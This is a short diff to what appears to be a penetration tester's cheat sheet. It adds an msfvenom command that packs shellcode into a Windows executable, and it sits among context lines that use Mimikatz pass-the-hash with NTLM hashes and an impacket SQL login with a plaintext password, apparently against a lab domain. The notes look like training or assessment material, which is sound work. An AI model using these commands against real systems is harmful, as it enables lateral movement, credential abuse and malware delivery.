@@ -342,6 +342,10 @@ sekurlsa::pth /user:pat /domain:corpy.com /ntlm:61c6e14f88cd70638f901ea51796a194
 ```
 sekurlsa::pth /user:administrator /domain:web06 /ntlm:f99529e42ee77dc4704c568ba9320a34 /run:"mstsc.exe /restrictedadmin"
 ```
+msfvenom load shellcode from stdin
+```
+cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform win -o mal.exe
+```
 mssqlclient
 ```
 proxychains -q -f met.conf impacket-mssqlclient willy:'fdsfssdfDFG4'@sql05.corpy.com -windows-auth
